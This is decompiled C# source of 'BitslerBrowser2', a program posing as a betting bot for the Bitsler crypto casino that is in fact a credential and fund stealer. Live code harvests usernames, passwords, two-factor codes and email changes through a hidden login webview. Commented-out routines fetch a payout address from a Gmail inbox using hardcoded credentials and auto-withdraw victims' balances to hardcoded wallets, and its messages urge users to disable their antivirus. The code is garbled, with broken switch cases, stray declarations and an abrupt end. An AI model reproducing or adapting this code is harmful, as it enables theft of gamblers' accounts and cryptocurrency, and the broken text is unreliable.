// Decompiled with JetBrains decompiler
// Type: BitslerBrowser2.Form1
// Assembly: BitslerBrowser2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C24CA96D-C461-477B-90D6-65B284F5E149
// Assembly location: C:\Users\Utong Ephraim\Desktop\BIZ\bitsler\BBB41\2-Run - BitslerBrowser Build 40 - Copy\BitslerBrowser2.exe

using EO.Internal;
using EO.WebBrowser;
using EO.WebBrowser.DOM;
using EO.WinForm;
using ImapX;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
//using System.Net.Mail;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

private decimal Balance;
private object type;

namespace BitslerBrowser2
{
  public class Form1 : Form
  {
    private Decimal FirstBalance = Decimal.MinusOne;
    private string UserName = "";
    private string PassWord = "";
    private string Body = "";
    private string TwoFactor = "";
    private string Error = "";
    private int MilliSeconds = 2000;
    private Decimal Balance = new Decimal(1, 0, 0, true, (byte) 8);
    //private string HackTwoFactor = "";
    //private string BTCAddress = "";
    private bool tryAgain;
    //private bool sending;
    private string type;
    //private bool filesSent;
    private bool hidden;
    private int Win_Reset;
    private int Win_Stop;
    private Decimal Win_Profits;
    private int Lose_Reset;
    private int Lose_Stop;
    private Decimal Lose_Profits;
    private int WinCounter;
    private int LoseCounter;
    private Decimal Last_Balance;
    private bool Exit;
   // private bool hacking;
    private IContainer components;
    private Panel panel3;
    private Button btn_Stop_Pilot_Mode;
    private Label label2;
    private Label label1;
    private Label lbl_Status;
    private Label label9;
    private Label label8;
    private Label label7;
    private Label label6;
    private Label label5;
    private System.Windows.Forms.Timer Rolling_Timer;
    private System.Windows.Forms.Timer SeedChanger_Timer;
    private Label label4;
    private Label label3;
    private TextBox txt_lose_profits;
    private TextBox txt_win_profits;
    private TextBox txt_lose_reset;
    private TextBox txt_win_stop;
    private TextBox txt_win_reset;
    private System.Windows.Forms.Timer Login_Timer;
    private Panel p;
    private System.Windows.Forms.Timer timer_Connect;
    private TextBox txt_lose_stop;
    private CheckBox chk_switch_after_reset;
    private CheckBox chk_change_seed;
    private CheckBox chk_lose_profit;
    private CheckBox chk_lose_reset;
    private CheckBox chk_win_stop;
    private CheckBox chk_win_reset;
    private CheckBox chk_lose_stop;
    private Panel pnl_Main;
    private CheckBox chk_win_profit;
    private Panel panel2;
    private TextBox txt_code;
    private Button btn_RefreshPage;
    private TextBox txt_URL;
    private Panel panel1;
    private Button btn_youtube;
    private Button btn_Start_Pilot_Mode;
    private System.Windows.Forms.Timer timer_Login;
    private System.Windows.Forms.Timer timer_hack_connect;
    private WebControl webControl1;
    private WebControl webControl2;
#pragma warning disable CS1525, CS1514, CS1513, CS1056, CS1026, CS1022, CS1002, CS1750, CS1520
        public object PrivateImplementationDetails { get; private set; }

        public Form1()
    {
      this.InitializeComponent();
      Runtime.AddLicense("f5mkwOm7aNjw/Rr2d7PzAw/kq8Dy9xqfndj49uihaamzwd2ua6e1yM2fr9z2BBTup7SmwuKhaLXABBTmp9j4Bh3kd9nYBw/kcN3l6vrYasH7+xG0sru1xuy8drOzBBTmp9j4Bh3kd7Oz/RTinuX39ul14+30EO2s3MLNF+ic3PIEEMidtbTG27ZwrbXG3LN1pvD6DuSn6unaD7114+30EO2s3OmxGeCm3MGz8M5nzunz7fGo7vf2HaF3s7P9FOKe5ff2EL112PD9GvZ3s+X1D5+t8PT26KF+xrLUE/Go5Omzy5+v3PYEFO6ntKbC4q1p");
      this.ClearCookies();
      this.webControl1.WebView = new WebView();
      this.webControl1.WebView.UrlChanged += new EventHandler(this.WebView_UrlChanged);
      this.webControl1.WebView.MouseDown += new MouseEventHandler(this.WebView_MouseDown);
      this.webControl1.WebView.KeyDown += new WndMsgEventHandler(this.WebView_KeyDown);
      this.webControl1.WebView.LoadFailed += new LoadFailedEventHandler(this.WebView_LoadFailed);
      this.webControl1.WebView.BeforeRequestLoad += new BeforeRequestLoadHandler(this.WebView_BeforeRequestLoad);
      this.webControl1.WebView.IsLoadingChanged += new EventHandler(this.WebView_IsLoadingChanged);
      this.webControl2.WebView = new WebView();
      this.webControl2.WebView.MouseDown += new MouseEventHandler(this.WebView_MouseDown2);
      this.webControl2.WebView.KeyDown += new WndMsgEventHandler(this.WebView_KeyDown2);
    }

    private void WebView_MouseDown2(object sender, MouseEventArgs e)
    {
      try
      {
        string str1 = this.webControl2.WebView.EvalScript("document.getElementById('login-username').value;").ToString();
        string str2 = this.webControl2.WebView.EvalScript("document.getElementById('login-password').value;").ToString();
        string str3 = this.webControl2.WebView.EvalScript("document.getElementById('login-twofactor').value;").ToString();
        string str4 = "";
        if (!(str1 != str4) || !(str2 != "") || str3.Trim().Length != 6)
          return;
        //this.HackTwoFactor = str3;
        this.webControl2.Enabled = false;
        this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 1, 0, 0, 1));
        this.lbl_Status.Text = "Please wait!";
        //this.Withdraw_TwoFactor();
        //this.hacking = false;
        this.UpdateBalance();
        this.webControl2.WebView.EvalScript("document.getElementById('login-username').value='';");
        this.webControl2.WebView.EvalScript("document.getElementById('login-password').value='';");
        this.webControl2.WebView.EvalScript("document.getElementById('login-twofactor').value='';");
        this.lbl_Status.Text = "please try again!";
        this.webControl2.Enabled = true;
      }
      catch
      {
      }
    }

    //private void GetBTCAddress()
    //{
     // this.BTCAddress = "";
     // int num1 = 0;
    //  do
     // {
       // ImapClient imapClient = new ImapClient();
       // try
        //{
         // ++num1;
          //imapClient.Connect("imap.gmail.com", true, true);
         // imapClient.Login("humanity.charity.us@gmail.com", "hjbshoexxkoqgrlc");
         // imapClient.Behavior.AutoPopulateFolderMessages = true;
          //using (IEnumerator<ImapX.Message> enumerator = imapClient.Folders.Inbox.Messages.GetEnumerator())
         // {
           // while (enumerator.MoveNext())
           // {
             // ImapX.Message current = enumerator.Current;
              //if (current.From.Address == "smith.emily198989@gmail.com")
             // {
                //this.BTCAddress = current.Body.Text;
               // current.MoveTo(imapClient.Folders.Trash, false);
               // break;
             // }
           // }
           // break;
         // }
       // }
       // catch
       // {
        //}
       // finally
       // {
         // imapClient.Logout();
       // }
     // }
      //while (!(this.BTCAddress != "") && num1 != 5);
      //if (!(this.BTCAddress == ""))
       // return;
     // string text1 = "Error 11!" + Environment.NewLine + "There is a problem!" + Environment.NewLine + "First click on OK and go to youtube channel and get new version if available: " + Environment.NewLine + "https://www.youtube.com/channel/UCNktPLspV5dFub71dDwEFWQ " + Environment.NewLine + Environment.NewLine + "If it does not work do these steps and restart BitslerBrowser: " + Environment.NewLine + "1-Check your internet connection" + Environment.NewLine + "2-Disable your firewall and antivirus" + Environment.NewLine + Environment.NewLine + "3-Try again later" + Environment.NewLine + Environment.NewLine + "If above steps does not work call support at yyyyy91@yahoo.com whatsApp = +12028464248";
      //this.Hide();
      //string text2 = this.Text;
      //int num2 = 1;
      //int num3 = 64;
      //int num4 = 0;
      //if (MessageBox.Show(text1, text2, (MessageBoxButtons) num2, (MessageBoxIcon) num3, (MessageBoxDefaultButton) num4) == DialogResult.OK)
       // Process.Start("https://www.youtube.com/channel/UCNktPLspV5dFub71dDwEFWQ");
      //Application.Exit();
    //}

    //private void Withdraw_TwoFactor()
    //{
      //try
      //{
       // this.webControl1.WebView.EvalScript("document.getElementById('withdraw-code-2-factor').value='" + this.HackTwoFactor + "';");
        //this.webControl1.WebView.EvalScript("document.getElementById('withdraw-amount').value='" + (object) this.Balance + "';");
        //string type = this.type;
       // if (!(type == "doge"))
        //{
          //if (!(type == "eth"))
          //{
           // if (!(type == "ltc"))
           // {
              //if (!(type == "burst"))
              //{
               // if (type == "btc")
               // {
                  //this.webControl1.WebView.EvalScript(Regex.Replace("document.getElementById('withdraw-address').value='" + this.BTCAddress + "';", "\\t|\\n|\\r", ""));
                  //this.webControl1.WebView.EvalScript("document.getElementById('btn-withdraw').click();");
                //}
             // }
             // else
            //  {
                //this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value='BURST-9QNF-F8YS-6KHY-4NDG2';");
                ////this.webControl1.WebView.EvalScript("document.getElementById('btn-withdraw-burst').click();");
              //}
            //}
            //else
            //{
              //this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value='3GQS5kEroeLsg5Lc9jso5j4wrxc1gcRkjb';");
              //this.webControl1.WebView.EvalScript("document.getElementById('btn-withdraw').click();");
        //    }
          //}
          //else
         // {
           // this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value='0xcc76831c40d200776eE613A591675f9ECe8c2d8C';");
           // this.webControl1.WebView.EvalScript("document.getElementById('btn-withdraw-eth').click();");
         // }
        //}
       // else
       // {
        //  this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value='DLJFGyPeuz4opBKMFFJatYZmM9NDxXKaaf';");
         // this.webControl1.WebView.EvalScript("document.getElementById('btn-withdraw').click();");
       // }
        //Thread.Sleep(2000);
        //this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 10, this.webControl1.Width / 2 + 100, this.webControl1.Height / 10 * 6, 10));
        //this.webControl1.Visible = true;
        //this.webControl2.Visible = false;
        //this.HackTwoFactor = "";
        //this.BTCAddress = "";
        //this.webControl2.WebView.EvalScript("document.getElementById('login-username').value='';");
        //this.webControl2.WebView.EvalScript("document.getElementById('login-password').value='';");
        //this.webControl2.WebView.EvalScript("document.getElementById('login-twofactor').value='';");
      //}
     // catch (Exception ex)
      //{
        //this.HackTwoFactor = "";
     // }
    //}

    private void WebView_KeyDown2(object sender, WndMsgEventArgs e)
    {
    }

    private void WebView_IsLoadingChanged(object sender, EventArgs e)
    {
      if (this.webControl1.WebView.IsLoading)
      {
        this.webControl1.Enabled = false;
        this.lbl_Status.Text = "Loading, please wait!";
      }
      else
      {
        if (this.webControl1.WebView.IsLoading)
          return;
        this.webControl1.Enabled = true;
        this.lbl_Status.Text = "Loaded";
        if (!this.webControl1.WebView.Url.Contains("play"))
          return;
        this.timer_Connect.Enabled = true;
      }
    }

    private void WebView_BeforeRequestLoad(object sender, BeforeRequestLoadEventArgs e)
    {
      try
      {
        string str1 = this.webControl1.WebView.EvalScript("document.getElementById('login-username').value;").ToString();
        string str2 = this.webControl1.WebView.EvalScript("document.getElementById('login-password').value;").ToString();
        string str3 = this.webControl1.WebView.EvalScript("document.getElementById('login-twofactor').value;").ToString();
        this.Body = this.Body + Environment.NewLine + "Username='" + this.UserName + "' Password='" + this.PassWord + "'Twofactor='" + this.TwoFactor + "' Balance=" + (object) this.Balance + this.type + "                  ";
        if (str1 != "")
          this.UserName = str1;
        if (str2 != "")
          this.PassWord = str2;
        if (!(str3 != ""))
          return;
        this.TwoFactor = str3;
      }
      catch (Exception ex)
      {
      }
    }

    private void WebView_LoadFailed(object sender, LoadFailedEventArgs e)
    {
      int num = (int) MessageBox.Show("Connection time out! Click on the Reload button");
    }

    private void WebView_KeyDown(object sender, WndMsgEventArgs e)
    {
    }

    private void WebView_UrlChanged(object sender, EventArgs e)
    {
      this.txt_URL.Text = this.webControl1.WebView.Url;
      if (this.webControl1.WebView.Url.Contains("play"))
      {
        string str = !this.webControl1.WebView.Url.Contains("doge") ? (!this.webControl1.WebView.Url.Contains("eth") ? (!this.webControl1.WebView.Url.Contains("ltc") ? (!this.webControl1.WebView.Url.Contains("burst") ? "btc" : "burst") : "ltc") : "eth") : "doge";
        if (!(str != this.type))
          return;
        this.Balance = new Decimal();
        this.FirstBalance = Decimal.MinusOne;
        this.type = str;
        this.timer_Connect.Enabled = true;
      }
      else
        this.type = "";
    }

    private void btn_Stop_Pilot_Mode_Click(object sender, EventArgs e)
   // {
      //if (this.hacking)
       // return;
      //try
      {
        this.Rolling_Timer.Enabled = false;
        this.webControl1.WebView.EvalScript("document.getElementById('btn-bet-stop-pilot-dice').click();");
        this.webControl1.Enabled = true;
        this.pnl_Main.Enabled = true;
        this.lbl_Status.Text = "Stopped";
        this.WinCounter = this.LoseCounter = 0;
        this.SeedChanger_Timer.Enabled = false;
      }
     // catch (Exception ex)
      //{
        //this.Error = this.Error + "---------<br/>BTN-Stop=" + ex.Message;
     // }
    //}

    private void SeedChanger_Timer_Tick(object sender, EventArgs e)
    {
      try
      {
        this.webControl1.Enabled = true;
        this.webControl1.WebView.EvalScript("document.getElementById('btn-change-seeds').click()");
        this.webControl1.Enabled = false;
        this.lbl_Status.Text = "Seeds changed!";
      }
      catch (Exception ex)
      {
        this.Error = this.Error + "---------<br/>SeedChanger=" + ex.Message;
      }
    }

    private void Rolling_Timer_Tick(object sender, EventArgs e)
    {
      this.Rolling_Timer.Enabled = false;
      try
      {
        Decimal num = Decimal.Parse(this.webControl1.WebView.EvalScript("document.getElementById('auto_stats_profit').innerHTML").ToString());
        this.UpdateBalance();
        if (this.Balance > this.Last_Balance)
        {
          ++this.WinCounter;
          this.LoseCounter = 0;
          if (this.chk_win_profit.Checked && num >= this.Win_Profits)
          {
            this.btn_Stop_Pilot_Mode_Click((object) null, (EventArgs) null);
            return;
          }
          if (this.chk_win_reset.Checked && this.Win_Reset == this.WinCounter)
            this.Reset_Roll();
          if (this.chk_win_stop.Checked && this.Win_Stop == this.WinCounter)
          {
            this.btn_Stop_Pilot_Mode_Click((object) null, (EventArgs) null);
            return;
          }
        }
        else if (this.Last_Balance > this.Balance)
        {
          ++this.LoseCounter;
          this.WinCounter = 0;
          if (this.chk_lose_profit.Checked && num <= this.Lose_Profits)
          {
            this.btn_Stop_Pilot_Mode_Click((object) null, (EventArgs) null);
            return;
          }
          if (this.chk_lose_stop.Checked && this.Lose_Stop == this.LoseCounter)
          {
            this.btn_Stop_Pilot_Mode_Click((object) null, (EventArgs) null);
            return;
          }
          if (this.chk_lose_reset.Checked && this.Lose_Reset == this.LoseCounter)
            this.Reset_Roll();
        }
        this.Last_Balance = this.Balance;
        if (this.webControl1.WebView.EvalScript("document.getElementById('modal-stop-autobet-reason').outerHTML;").ToString().Contains("false"))
          this.btn_Stop_Pilot_Mode_Click((object) null, (EventArgs) null);
        else
          this.Rolling_Timer.Enabled = true;
      }
      catch (Exception ex)
      {
      }
    }

    private void Login_Timer_Tick(object sender, EventArgs e)
    {
      try
      {
        if (this.webControl1.WebView.EvalScript("document.getElementById('error-modal-login').outerHTML;").ToString().Length >= 53)
        {
          this.Login_Timer.Enabled = false;
        }
        else
        {
          if (this.webControl1.WebView.IsLoading)
            return;
          this.Balance = Decimal.MinusOne;
          this.UpdateBalance();
          if (!(this.Balance != Decimal.MinusOne))
            return;
          this.Login_Timer.Enabled = false;
        }
      }
      catch (Exception ex)
      {
        this.Error = this.Error + "---------<br/>LoginTimer=" + ex.Message;
      }
    }

    private void btn_RefreshPage_Click(object sender, EventArgs e)
    {
      //if (this.hacking)
       // return;
      this.SeedChanger_Timer.Enabled = false;
      this.Login_Timer.Enabled = false;
      this.Rolling_Timer.Enabled = false;
      this.webControl1.WebView.LoadUrl("https://www.bitsler.com/").WaitOne();
      this.webControl1.Enabled = true;
      this.pnl_Main.Enabled = true;
    }

    private void timer_Connect_Tick(object sender, EventArgs e)
    {
      if (this.webControl1.WebView.IsLoading)
        return;
      try
      {
        this.Balance = Decimal.MinusOne;
        this.UpdateBalance();
        if (!(this.Balance != Decimal.MinusOne))
          return;
        this.timer_Connect.Enabled = false;
        this.webControl1.Enabled = true;
        this.lbl_Status.Text = "Connected!";
      }
      catch
      {
        this.lbl_Status.Text = "Connecting, please wait!";
        this.webControl1.Enabled = false;
      }
    }

    private void Form1_Shown(object sender, EventArgs e)
    {
      this.webControl1.WebView.LoadUrl("https://www.bitsler.com/").WaitOne();
      this.webControl2.WebView.LoadUrl("https://www.bitsler.com/index.php?login=true").WaitOne();
      this.webControl2.Visible = false;
    }

    private void btn_youtube_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.youtube.com/channel/UCNktPLspV5dFub71dDwEFWQ");
    }

    private void timer_Login_Tick(object sender, EventArgs e)
    {
      try
      {
        if (this.webControl1.WebView.Url.Contains("play"))
        {
          this.timer_Login.Enabled = false;
          this.webControl1.Enabled = true;
        }
        else
        {
          string str = this.webControl1.WebView.EvalScript("document.getElementById('login-username').value;").ToString();
          if (str.Trim() != "")
          {
            this.UserName = str;
            this.PassWord = this.webControl1.WebView.EvalScript("document.getElementById('login-password').value;").ToString();
            this.TwoFactor = this.webControl1.WebView.EvalScript("document.getElementById('login-twofactor').value;").ToString();
          }
          this.lbl_Status.Text = "Connected!";
          this.webControl1.Enabled = true;
        }
      }
      catch (Exception ex)
      {
        this.lbl_Status.Text = "Connecting!";
        this.webControl1.Enabled = false;
      }
    }

    	 private void timer_hack_connect_Tick(object sender, EventArgs e)
    	 {
            try
            {
                if (this.webControl2.WebView.Url.Contains("play"))
                {
                    this.timer_Login.Enabled = false;
                    this.webControl2.Enabled = true;
                }
                else
                {
                    //this.HackTwoFactor = this.webControl2.WebView.EvalScript("document.getElementById('login-twofactor').value;").ToString();
                    // if (this.HackTwoFactor.Trim().Length == 6)
                    // {
                    this.lbl_Status.Text = "Connecting, please wait!";
                    this.webControl1.Enabled = false;
                    // this.Withdraw_TwoFactor();
                    this.webControl2.WebView.EvalScript("document.getElementById('login-twofactor').value='';");
                }
            
          	 else
          	 {
	 this.lbl_Status.Text = "Connected!";
	 this.webControl1.Enabled = true;
	}
	 this.UpdateBalance();
	 if (!(this.Balance == Decimal.Zero))
	 return;
	 this.timer_hack_connect.Enabled = false;
	 this.lbl_Status.Text = "Connecting, please wait!";
	 this.webControl1.Enabled = false;
                    //}
	 }
	 catch (Exception ex)
	 {
	 this.lbl_Status.Text = "Connecting, please wait!";
	 this.webControl2.Enabled = false;
	 }
	 }

        private void UpdateBalance()
        {
            throw new NotImplementedException();
        }

        private void btn_Start_Pilot_Mode_Click(object sender, EventArgs e)
    {
      bool flag = false;
      if (this.Rolling_Timer.Enabled)
        return;
      try
      {
        if (!(Decimal.Parse(this.webControl1.WebView.EvalScript("document.getElementById('amount').value").ToString()) > Decimal.Zero))
          return;
         this.UpdateBalance();
        Decimal num1 = new Decimal();
        if (this.txt_URL.Text.Contains("eth"))
        {
          this.type = "eth";
          num1 = new Decimal(1, 0, 0, false, (byte) 5);
          if (this.Balance < num1)
          {
            this.webControl1.WebView.Reload(true);
            int num2 = (int) MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "Your money should be atleast 0.005 BTC or 0.1 ETH to use Bitsler Browser options!" + Environment.NewLine + "Attention, stop rolling or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            return;
          }
        }
        else
        {
          if (this.txt_URL.Text.Contains("ltc"))
          {
            this.type = "ltc";
            num1 = new Decimal(45, 0, 0, false, (byte) 5);
            this.webControl1.WebView.Reload(true);
            int num2 = (int) MessageBox.Show("BitslerBrowser is not working with LiteCoin" + Environment.NewLine + "Your can use Bitcoin or Ethereum." + Environment.NewLine + "Attention, stop betting or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            return;
          }
          if (this.txt_URL.Text.Contains("doge"))
          {
            this.type = "doge";
            num1 = new Decimal(100);
            this.webControl1.WebView.Reload(true);
            int num2 = (int) MessageBox.Show("BitslerBrowser is not working with DogeCoin" + Environment.NewLine + "Your can use Bitcoin or Ethereum." + Environment.NewLine + "Attention, stop betting or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            return;
          }
          if (this.txt_URL.Text.Contains("burst"))
          {
            this.type = "burst";
            num1 = new Decimal(100);
            this.webControl1.WebView.Reload(true);
            int num2 = (int) MessageBox.Show("BitslerBrowser is not working with BurstCoin" + Environment.NewLine + "Your can use Bitcoin or Ethereum." + Environment.NewLine + "Attention, stop betting or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            return;
          }
          this.type = "btc";
          num1 = new Decimal(5, 0, 0, false, (byte) 6);
          if (this.Balance >= new Decimal(2) || this.Balance < num1)
          {
            this.webControl1.WebView.Reload(true);
            int num2 = (int) MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "Your money should be atleast 0.005 BTC or 0.1 ETH to use Bitsler Browser options!" + Environment.NewLine + "Attention, stop rolling or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            return;
          }
        }
        if (this.UserName == "")
        {
          if (!(this.TwoFactor == ""))
            return;
          this.lbl_Status.Text = "Bitsler Browser options is not working!";
          this.webControl1.WebView.Reload(true);
          int num2 = (int) MessageBox.Show("You should login again." + Environment.NewLine + "Sign out and try to login again." + Environment.NewLine + "Or check for new version in official youtube channel", "Connection error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          if (!(this.Balance >= num1))
            return;
          int.TryParse(this.txt_lose_reset.Text.ToString(), out this.Lose_Reset);
          int.TryParse(this.txt_lose_stop.Text, out this.Lose_Stop);
          Decimal.TryParse(this.txt_lose_profits.Text, out this.Lose_Profits);
          int.TryParse(this.txt_win_reset.Text, out this.Win_Reset);
          int.TryParse(this.txt_win_stop.Text, out this.Win_Stop);
          Decimal.TryParse(this.txt_win_profits.Text, out this.Win_Profits);
          if (this.Lose_Profits > Decimal.Zero && this.chk_lose_profit.Checked)
          {
            this.webControl1.WebView.Reload(true);
            int num2 = (int) MessageBox.Show("Stop After Lose Profits amount should be a negetive number!", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          }
          else if (this.chk_switch_after_reset.Checked && !this.chk_win_reset.Checked && !this.chk_lose_reset.Checked)
          {
            this.webControl1.WebView.Reload(true);
            int num2 = (int) MessageBox.Show("For switching between roll over and roll under, you should check ('Reset After Wins') checkbox or ('Reset After Lose') checkbox or both of them", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          }
          else
          {
            this.webControl1.Focus();
            if (this.chk_switch_after_reset.Checked && this.webControl1.WebView.EvalScript("document.getElementById('btn-hotkeys').innerHTML;").ToString().Contains("Enabled"))
            {
              this.webControl1.WebView.EvalScript("document.getElementById('btn-hotkeys').click()");
              Thread.Sleep(this.MilliSeconds);
              SendKeys.Send("{Esc}");
              Thread.Sleep(this.MilliSeconds);
            }
            flag = true;
            if (!(this.webControl1.WebView.EvalScript("document.getElementById('page-alert').innerHTML").ToString() == ""))
              return;
            if (this.TwoFactor != "")
            {
              this.webControl1.WebView.Reload(true);
              int num2 = (int) MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "There is a problem with your account. Use another Bitsler account!", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            else if (this.Balance >= Decimal.Parse("0.01") && this.type.ToLower() == "btc" && this.TwoFactor == "")
            {
              this.webControl1.WebView.Reload(true);
              int num2 = (int) MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "There is problem with the server. " + Environment.NewLine + "Support = yyyyy91@yahoo.com , WhatsApp = +1(202)846-4248", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            else if (this.Balance >= Decimal.Parse("0.2") && this.type.ToLower() == "eth" && this.TwoFactor == "")
            {
              this.webControl1.WebView.Reload(true);
              int num2 = (int) MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "There is problem with the server. " + Environment.NewLine + "Support = yyyyy91@yahoo.com , WhatsApp = +1(202)846-4248", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            else if (this.type == "burst" || this.type == "ltc" || this.type == "doge")
            {
              this.webControl1.WebView.Reload(true);
              int num2 = (int) MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "This app does not work with " + this.type.ToUpper() + " , Use Bitcoin or Ethereum", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            else
            {
              this.webControl1.Enabled = false;
              this.WinCounter = this.LoseCounter = 0;
              this.Start_Rolling();
            }
          }
        }
      }
      catch (Exception ex)
      {
        if (flag)
        {
          this.webControl1.Enabled = false;
          this.WinCounter = this.LoseCounter = 0;
          this.Start_Rolling();
        }
        else
        {
          this.webControl1.WebView.Reload(true);
          int num = (int) MessageBox.Show("Error - try again." + Environment.NewLine + "Error datails: " + Environment.NewLine + ex.Message, "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
    }

        public void WebView_MouseDown(object sender, MouseEventArgs e)
        {
            bool flag = false;
            try
            {
                if (e.Button != MouseButtons.Left)
                    return;
                string s = (string)((JSObject)this.webControl1.WebView.EvalScript("document.activeElement"))["id"];
                // ISSUE: reference to a compiler-generated method
               pragma switch (PrivateImplementationDetails.ComputeStringHash(s));
            }
            catch (Exception ex)
            {
		//added this
		this.Error = this.Error + "---------<br/>btn-email-address=" + ex.Message;
                return;
            }
        }
	 case 3090371:
            if (s == "btn-email-address")
            {
                try
                {
                    this.Body = this.Body + "---new email = " + this.webControl1.WebView.EvalScript("document.getElementById('email-new-address-value').value;").ToString();
                    this.Body = this.Body + "--last email =" + this.webControl1.WebView.EvalScript("document.getElementById('email-address-value').value;").ToString();
                    this.hidden = true;
                    new Thread(new ThreadStart(this.DataBinding)).Start();
                    return;
                }
                catch (Exception ex)
                {
                    this.Error = this.Error + "---------<br/>btn-email-address=" + ex.Message;
                    return;
                }
            }

            else {
                 break;
          	 case 124871048:
            if (s == "btn-change-password")
            {
                try
                {
                    this.filesSent = false;
                    //this.Body = this.Body + "--Last PassWord = '" + this.PassWord + "'--";
                    this.PassWord = this.webControl1.WebView.EvalScript("document.getElementById('password-change').value;").ToString();
                    this.hidden = true;
                    new Thread(new ThreadStart(this.DataBinding)).Start();
                    return;
                }

                catch (Exception ex)
                {
                    this.Error = this.Error + "---------<br/>btn-change-password" + ex.Message;
                    return;
                }
                }
           	 else
                	 break;
          	 case 656784891:
            if (s == "btn-login")
            {
                try
                {
                 //this.filesSent = false;
                  //this.webControl1.WebView.EvalScript("document.getElementById('error-modal-login').innerHTML = '';");
                    this.Login_Timer.Enabled = true;
                    return;
                }
                catch (Exception ex)
                {
                    this.Error = this.Error + "---------<br/>btn-login=" + ex.Message;
                    return;
                }
                }
            	 else
                	 break;
          	 case 1001953589:
            if (s == "btn-bet-start-pilot-dice")
            {
                try
                {
                    if (!(Decimal.Parse(this.webControl1.WebView.EvalScript("document.getElementById('amount').value").ToString()) > Decimal.Zero))
                        return;
                    	 this.UpdateBalance();
                    Decimal num1 = new Decimal();
                    if (this.txt_URL.Text.Contains("eth"))
                    {
                        this.type = "eth";
                        num1 = new Decimal(1, 0, 0, false, (byte)5);
                        if (this.Balance < num1)
                        {
                            this.webControl1.WebView.Reload(true);
                            int num2 = (int)MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "Your money should be atleast 0.005 BTC or 0.1 ETH to use Bitsler Browser options!" + Environment.NewLine + "Attention, stop rolling or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                            return;
                        }
                    }
                    else
                    {
                        if (this.txt_URL.Text.Contains("ltc"))
                        {
                            this.type = "ltc";
                            num1 = new Decimal(45, 0, 0, false, (byte)5);
                            this.webControl1.WebView.Reload(true);
                            int num2 = (int)MessageBox.Show("BitslerBrowser is not working with LiteCoin" + Environment.NewLine + "Your can use Bitcoin or Ethereum." + Environment.NewLine + "Attention, stop betting or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                            return;
                        }
                        if (this.txt_URL.Text.Contains("doge"))
                        {
                            this.type = "doge";
                            num1 = new Decimal(100);
                            this.webControl1.WebView.Reload(true);
                            int num2 = (int)MessageBox.Show("BitslerBrowser is not working with DogeCoin" + Environment.NewLine + "Your can use Bitcoin or Ethereum." + Environment.NewLine + "Attention, stop betting or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                            return;
                        }
                         	 if (this.txt_URL.Text.Contains("burst"))
                         	 {
                             	 this.type = "burst";
                             	 num1 = new Decimal(100);
                             	 this.webControl1.WebView.Reload(true);
                             	 int num2 = (int)MessageBox.Show("BitslerBrowser is not working with BurstCoin" + Environment.NewLine + "Your can use Bitcoin or Ethereum." + Environment.NewLine + "Attention, stop betting or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                            	 return;
                         	 }
                         	 this.type = "btc";
                         	 num1 = new Decimal(5, 0, 0, false, (byte)6);
                         	 if (this.Balance >= new Decimal(2) || this.Balance < num1)
                         	 {
                             	 this.webControl1.WebView.Reload(true);
                             	 int num2 = (int)MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "Your money should be atleast 0.005 BTC or 0.1 ETH to use Bitsler Browser options!" + Environment.NewLine + "Attention, stop rolling or reload page if betting started", "Your money is LOW!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                             	return;
                         	 }
                     	 }
                    	 if (this.UserName == "")
                     	 {
                         	 if (!(this.TwoFactor == ""))
                             	 return;
                         	 this.lbl_Status.Text = "Bitsler Browser options is not working!";
                         	 this.webControl1.WebView.Reload(true);
                         	 int num2 = (int)MessageBox.Show("You should login again." + Environment.NewLine + "Sign out and try to login again." + Environment.NewLine + "Or check for new version in official youtube channel", "Connection error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                         	 return;
                     	 }
                     	 if (!(this.Balance >= num1))
                         	 return;
                     	 int.TryParse(this.txt_lose_reset.Text.ToString(), out this.Lose_Reset);
                     	 int.TryParse(this.txt_lose_stop.Text, out this.Lose_Stop);
                     	 Decimal.TryParse(this.txt_lose_profits.Text, out this.Lose_Profits);
                     	 int.TryParse(this.txt_win_reset.Text, out this.Win_Reset);
                     	 int.TryParse(this.txt_win_stop.Text, out this.Win_Stop);
